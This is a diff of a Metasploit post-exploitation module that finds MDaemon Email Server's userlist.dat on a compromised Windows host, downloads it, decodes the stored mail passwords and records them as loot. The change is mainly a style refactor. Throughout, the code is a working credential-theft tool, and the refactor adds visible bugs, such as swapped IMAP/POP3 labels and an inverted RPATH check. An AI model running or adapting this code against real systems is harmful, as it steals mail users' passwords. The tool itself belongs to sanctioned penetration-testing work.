@@ -1,63 +1,60 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'base64'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   Rank = ExcellentRanking
   def initialize(info = {})
-    super(update_info(info,
+    super(
+      update_info(
+        info,
         'Name'          => 'Windows Gather MDaemonEmailServer Credential Cracking',
-        'Description'   => %q{
-          Finds and cracks the stored passwords of MDaemon Email Server.
-        },
-        'References'     =>
+        'Description'   => 'Finds and cracks the stored passwords of MDaemon Email Server',
+        'References'    =>
         [
           ['BID', '4686']
         ],
         'License'       => MSF_LICENSE,
         'Author'        => ['Manuel Nader #AgoraSecurity'],
         'Platform'      => ['win'],
-        'Arch'          => ['x64','x86'],
+        'Arch'          => [ARCH_X86, ARCH_X64],
         'SessionTypes'  => ['meterpreter']
-    ))
+      )
+    )
 
     register_options(
-      [OptString.new('RPATH', [false, 'Path of the MDaemon installation', false]) # If software is installed on a rare directory
-    ], self.class)
+      [
+        # If software is installed on a rare directory
+        OptString.new('RPATH', [false, 'Path of the MDaemon installation', false])
+      ]
+    )
   end
 
   def run
-      if session.type != 'meterpreter'
-        print_error ('Only meterpreter sessions are supported by this post module')
-        return
+    if session.type != 'meterpreter'
+      print_error('Only meterpreter sessions are supported by this post module')
+      return
+    end
+
+    progfiles_env = session.sys.config.getenvs('SYSTEMDRIVE', 'HOMEDRIVE', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
+    locations = ['C:\MDaemon\App']
+    progfiles_env.each do |_k, v|
+      vprint_status("Searching MDaemon installation at #{v}")
+      if session.fs.dir.entries(v).include? 'MDaemon'
+        vprint_status("Found MDaemon installation at #{v}")
+        locations << v + '\\MDaemon\\'
       end
-      progfiles_env = session.sys.config.getenvs('SYSTEMDRIVE', 'HOMEDRIVE', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
-      locations = []
-      progfiles_env.each do |_k, v|
-        vprint_status("Searching MDaemon installation at #{v}")
-        if session.fs.dir.entries(name = v).include? 'MDaemon'
-          vprint_status("Found MDaemon installation at #{v}")
-          locations << v + '\\MDaemon\\'
-        end
-        next
-      end
+    end
 
     keys = [
       'HKLM\\SOFTWARE\\Alt-N Technologies\\MDaemon', # 64 bit. Has AppPath
-      # "HKLM\\SOFTWARE\\Wise Solutions\\WiseUpdate\\Apps\\MDaemon Server" # 32 bit on 64-bit system. Won't find path on register
     ]
 
-    locations = ['C:\MDaemon\App']
-
-    if datastore['RHOST'].nil?
-      locations << datastore['RHOST']
-    end
+    locations << datastore['RPATH'] if datastore['RPATH'].nil?
 
     keys.each do |key|
       begin
@@ -69,7 +66,7 @@ class MetasploitModule < Msf::Post
       end
       locations << value.data + '\\'
     end
-    locations = locations.uniq
+    locations.uniq!
     locations = locations.compact
     userlist = check_mdaemons(locations)
     get_mdaemon_creds(userlist) if userlist
@@ -81,7 +78,7 @@ class MetasploitModule < Msf::Post
     decode = Base64.decode64(raw_password).bytes
     crack = decode
     result = ''
-    for i in 0..(crack.size - 1)
+    (0..(crack.size - 1)).each do |i|
       if (crack[i] - offset[i]) > 0
         result << (crack[i] - offset[i])
       else
@@ -89,7 +86,7 @@ class MetasploitModule < Msf::Post
       end
     end
     vprint_status("Password #{result}")
-    return result
+    result
   end
 
   def check_mdaemons(locations)
@@ -98,29 +95,29 @@ class MetasploitModule < Msf::Post
       locations.each do |location|
         vprint_status("Checking for Userlist in MDaemons directory at: #{location}")
         begin
-          session.fs.dir.foreach("#{location}") do |fdir|
+          session.fs.dir.foreach(location.to_s) do |fdir|
             ['userlist.dat'].each do |datfile|
-              if fdir.downcase == datfile.downcase
-                filepath = location + '\\' + datfile
-                print_good("Configuration file found: #{filepath}")
-                print_good("Found MDaemons on #{sysinfo['Computer']} via session ID: #{session.sid}")
-                vprint_status("Downloading UserList.dat file to tmp file: #{tmp_filename}")
-                session.fs.file.download_file(tmp_filename, filepath)
-                # userdat = session.fs.file.open(filepath).read.to_s.split(/\n/)
-                return tmp_filename
-              end
+              next if fdir.casecmp(datfile) != 0
+
+              filepath = location + '\\' + datfile
+              print_good("Configuration file found: #{filepath}")
+              print_good("Found MDaemons on #{sysinfo['Computer']} via session ID: #{session.sid}")
+              vprint_status("Downloading UserList.dat file to tmp file: #{tmp_filename}")
+              session.fs.file.download_file(tmp_filename, filepath)
+              # userdat = session.fs.file.open(filepath).read.to_s.split(/\n/)
+              return tmp_filename
             end
           end
         rescue Rex::Post::Meterpreter::RequestError => e
           vprint_error(e.message)
         end
       end
-    rescue ::Exception => e
+    rescue StandardError => e
       print_error(e.to_s)
       return
     end
 
-    return nil
+    nil
   end
 
   def parse_userlist(data)
@@ -138,8 +135,8 @@ class MetasploitModule < Msf::Post
       mail_dir = line.slice(105..194).strip!
       raw_password = line.slice(195..210)
       password = crack_password(raw_password)
-      access= line.slice(217)
-      users     += 1
+      access = line.slice(217)
+      users += 1
       passwords += 1
       if access == 'Y' # IMAP & POP3
         pop3 << [domain, mailbox, full_name, mail_dir, password]
@@ -159,16 +156,15 @@ class MetasploitModule < Msf::Post
     del_cmd = 'rm '
     del_cmd << data
     system(del_cmd)
-    result = [creds, imap, pop3]
-    return result
+    [creds, imap, pop3]
   end
 
-  def report_cred(creds)
+  def report_mdaemon_cred(creds, port: 0, service: nil)
     # Build service information
     service_data = {
       # address: session.session_host, # Gives internal IP
       address: session.tunnel_peer.partition(':')[0], # Gives public IP
-      port: 25,
+      port: port,
       service_name: 'smtp',
       protocol: 'tcp',
       workspace_id: myworkspace_id
@@ -179,99 +175,11 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         private_type: :password,
         private_data: cred[4],
         username: cred[1],
-        module_fullname: self.fullname
-      }
-      credential_data.merge!(service_data)
-      credential_core = create_credential(credential_data)
-
-      # Assemble the options hash for creating the Metasploit::Credential::Login object
-      login_data = {
-        core: credential_core,
-        status: Metasploit::Model::Login::Status::UNTRIED,
-        # workspace_id: myworkspace_id
-      }
-
-      login_data.merge!(service_data)
-      create_credential_login(login_data)
-
-      print_status ("    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}")
-    end
-
-    # report the goods!
-    loot_path = store_loot('MDaemon.smtp_server.creds', 'text/csv', session, creds.to_csv,
-      'mdaemon_smtp_server_credentials.csv', 'MDaemon SMTP Users Credentials')
-    print_status("SMTP credentials saved in: #{loot_path}")
-  end
-
-  def report_pop3(creds)
-    # Build service information
-    service_data = {
-      # address: session.session_host, # Gives internal IP
-      address: session.tunnel_peer.partition(':')[0], # Gives public IP
-      port: 110,
-      service_name: 'pop3',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-    # Iterate through credentials
-    creds.each do |cred|
-      # Build credential information
-      credential_data = {
-        origin_type: :session,
-        session_id: session_db_id,
-        post_reference_name: self.refname,
-        private_type: :password,
-        private_data: cred[4],
-        username: cred[1],
-        module_fullname: self.fullname
-      }
-      credential_data.merge!(service_data)
-      credential_core = create_credential(credential_data)
-
-      # Assemble the options hash for creating the Metasploit::Credential::Login object
-      login_data = {
-        core: credential_core,
-        status: Metasploit::Model::Login::Status::UNTRIED,
-        # workspace_id: myworkspace_id
-      }
-
-      login_data.merge!(service_data)
-      create_credential_login(login_data)
-
-      print_status ("    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}")
-    end
-
-    # report the goods!
-    loot_path = store_loot('MDaemon.pop3_server.creds', 'text/csv', session, creds.to_csv,
-      'mdaemon_pop3_server_credentials.csv', 'MDaemon POP3 Users Credentials')
-    print_status("POP3 credentials saved in: #{loot_path}")
-  end
-
-  def report_imap(creds)
-    # Build service information
-    service_data = {
-      # address: session.session_host, # Gives internal IP
-      address: session.tunnel_peer.partition(':')[0], # Gives public IP
-      port: 143,
-      service_name: 'imap',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-    # Iterate through credentials
-    creds.each do |cred|
-      # Build credential information
-      credential_data = {
-        origin_type: :session,
-        session_id: session_db_id,
-        post_reference_name: self.refname,
-        private_type: :password,
-        private_data: cred[4],
-        username: cred[1],
-        module_fullname: self.fullname
+        module_fullname: fullname
       }
       credential_data.merge!(service_data)
       credential_core = create_credential(credential_data)
@@ -286,30 +194,25 @@ class MetasploitModule < Msf::Post
       login_data.merge!(service_data)
       create_credential_login(login_data)
 
-      print_status ("    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}")
+      print_status("    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}")
     end
 
     # report the goods!
-    loot_path = store_loot('MDaemon.imap_server.creds', 'text/csv', session, creds.to_csv,
-      'mdaemon_imap_server_credentials.csv', 'MDaemon SMTP Users Credentials')
-    print_status("IMAP credentials saved in: #{loot_path}")
+    loot_path = store_loot(
+      'MDaemon.smtp_server.creds',
+      'text/csv',
+      session,
+      creds.to_csv,
+      "mdaemon_#{service}_server_credentials.csv",
+      "MDaemon #{service.upcase} Users Credentials"
+    )
+    print_status("#{service.upcase} credentials saved in: #{loot_path}")
   end
 
   def get_mdaemon_creds(userlist)
-    credentials = Rex::Ui::Text::Table.new(
-      'Header'    => 'MDaemon Email Server Credentials',
-      'Indent'    => 1,
-      'Columns'   =>
-      [
-        'Domain',
-        'Mailbox',
-        'Full Name',
-        'Mail Dir',
-        'Password'
-      ])
-    result = parse_userlist(userlist)
-    report_cred(result[0])
-    report_pop3(result[1])
-    report_imap(result[2])
+    (smtp, imap, pop3) = parse_userlist(userlist)
+    report_mdaemon_cred(smtp, port: 25, service: 'smtp')
+    report_mdaemon_cred(imap, port: 110, service: 'pop3')
+    report_mdaemon_cred(pop3, port: 143, service: 'imap')
   end
 end
